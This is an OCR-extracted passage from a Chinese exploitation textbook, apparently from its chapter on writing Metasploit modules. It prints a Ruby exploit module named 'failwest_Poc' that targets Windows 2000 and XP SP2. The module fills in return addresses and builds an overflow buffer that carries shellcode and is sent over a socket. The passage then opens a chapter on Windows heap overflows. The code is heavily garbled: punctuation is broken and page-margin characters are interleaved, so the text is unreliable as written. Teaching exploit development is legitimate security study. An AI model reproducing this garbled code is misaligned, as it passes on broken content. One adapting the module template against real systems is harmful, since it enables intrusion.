def initialize
定义模块初始化信息，如漏润适用的操作系统平台、为不同操作系
#统指明不同的返回地址、指明shellcode中禁止出现的特殊字符、
漏洞相关的描述、URL引用、作者信息等
end
defexploit
#将填充物、返回地址、shellcode等组织成最终的attack_buffer，并
发送
end
end
可见为MSF开发模块的过程实际上就是实现这两个方法的过程。下面分别来看看这两个
方法。
initialize方法的实现非常简单，在某种意义上更像是在“填空”。本节例子中只“填”了最
基本的信息。
super(update_info(info,
'Name'
'Targets'
['Windows2000',('Ret'=>0x77F8948B]],
['WindowsXPSP2'.('Ret'=>0x7C914393）]
'Payload'
=>（
'Space'=>200,
ox.'failwest_Poc',
'Version'
=>'1.0',
'Platform'
=>'win',
'Privileged'=>true,
ET
'License'
=>MSF_LICENSE,
'Author'
=>'FAILWEST',
'Targets'
][200,0x77F8948B])],
['WindowsXPSP2',('Ret*=>.[200,0x7C914393]}],
'DefaultTarget'=>0,
'Payload'
}"\x0o",
StackAdjustment'*>-3500,
),
Description'=>q(
this moduleis exploit practice ofbook
VulnerabilityExploitand AnalysisTechnique
used onlyforeducationalpurpose
Arch'
=>'x86',
'References'
=>[
['URL','http://www.failwest.com'],
['CVE','44444'],
'process
））
end #end of initialize
def exploit
141
---
## Page 167
0
day
connect
安
全
payload...")
..]bx.e,
软
buf<<[target['Ret'][1]].pack('v')
件
buf<<payload.encoded;
漏
sock.put(buf)
洞
handler
分
disconnect
析
end
#endof exploitdef
技
end
术
（第
将其保存为poc.rb，放在正确的目录下，启动MSF，在Web界面下单击“Exploits”按钮，
搜索“failwest”，如图4.7.1所示。
2
版
pooes年d
SEARCHfaiwest
Matched 2 modules for term farhwest
failwest_Poc
this module is exploit practice of book Vulnerabity Exploit and Analyis Technique used only
sodundeuoenpe
failwest_test
No module description
图4.7.1新添加的POC模块
其中的failwest_POC就是本节扩充过附属信息的模块，第二个没有描述信息的是上节完成
的模块。选用之，如图4.7.2所示。
可以看到我们在模块中填写的信息都已经显示在界面上。这些信息通过命令“info”也可
以在命令行环境下显示出来。
这样，一个包含了各种附属信息的标准POC就完成了。即使对完全不了解我们程序中漏
洞的人，通过这个模块也能迅速掌握所有技术细节。
142
---
## Page 168
第
farlwest_POC 1？)
4
章
failwest_Poc
this module is exploit practice of bookVulnerability Exploit and Analysis Techniqueused only for
旺MetaSploit装Exploit
asodnd euoeonpe
This module (v1.0) was provided by FAILWEST.under the Metaspioit Framework License (BSD)
Select a target to continue:
Windows.2000
Windows XP SP2
Extemal roferences:
http://www.failwest.com
htto://cve.mitre_org/cqi-bin/cvename_cqi?name=44444
图4.7.2在Web中显示exploit模块的信息
143
---
## Page 169
第5章堆溢出利用
千凿万钻出深山，烈火楚烧若等闲
《石灰吟》于谦
光荣在于平淡，艰巨在于漫长，学习安全技术的路并不好走，面对着“杂乱无章”的“堆”
更是如此。本章是Windows缓冲区溢出基础知识的最后一站，也是滩度最大的一站。如果您能
坚持学完本章，那么迎接您的将是一条平坦大道，
5.1堆的工作原理
5.1.1Windows堆的历史
Windows的堆是内存中一块神秘的地方、一个耐人寻味的地方，也是一个“乱糟糟”的地方。
微软并没有完全公开其操作系统中堆管理的细节。目前为止，对Windows堆的了解主要基
于技术狂热者、黑客、安全专家、逆向工程师等的个人研究成果。通过无数前辈们的努力工作，
现在，WindowsNT4\2000sp4上的堆管理策略已经“基本”上被研究清楚了。
性，要想真正搞清楚微软堆中的所有细节，还要寄希望于微软的共享精神，光靠黑客们的逆向、
试验和猜测是远远不够的。
在众多研究Windows堆的前辈中，有几位以他们精湛的技术、坚韧的耐心和优秀的共享精
神在安全领域而闻名。
（1）HalvarFlake：2002年的blackhat上，他在演讲“ThirdGenerationExploitation”中首
次挑战Windows的堆溢出，并揭秘了堆中一些重要的数据结构和算法。
（2）DavidLitchfield：David应该是安全技术界的传奇人物。除了他曾经发现的那些被横
扫世界的烯虫所利用的Oday漏洞外，他还是著名的安全咨询公司NGS（NextGenerationSecurity)
的创始人。David在2004年blackhat上演讲的“WindowsHeapOverflows”首次比较全面地介
绍了Windows2000平台下堆溢出的技术细节，包括了重要数据结构、堆分配算法、利用思路、
劫持进程的方法、执行shellcode时会遇到的问题等。那次演讲的白皮书（Whitepaper）几乎是
所有研究Windows堆溢出人员的必读文献。
中与溢出相关的所有数据结构和分配策略之外，最重要的是，他还提出了突破WindowsXPSP2
平台下重重安全机制的防护进行堆溢出的方法。在本书的写作过程中，我有幸得到了Matt的
---
## Page 170
第
热情帮助，他关于堆的深刻见解为本书增色不少。
5
本章内容来源于这些前辈们关于Windows堆管理机制研究成果的总结与整理。了解这些精
戛
髓的知识除了对理解堆溢出利用至关重要外，对研究操作系统、文件系统的实现等也会有很大
堆
的帮助。
现代操作系统在经过了若干年的演变后，目前使用的堆管理机制兼顾了内存有效利用、分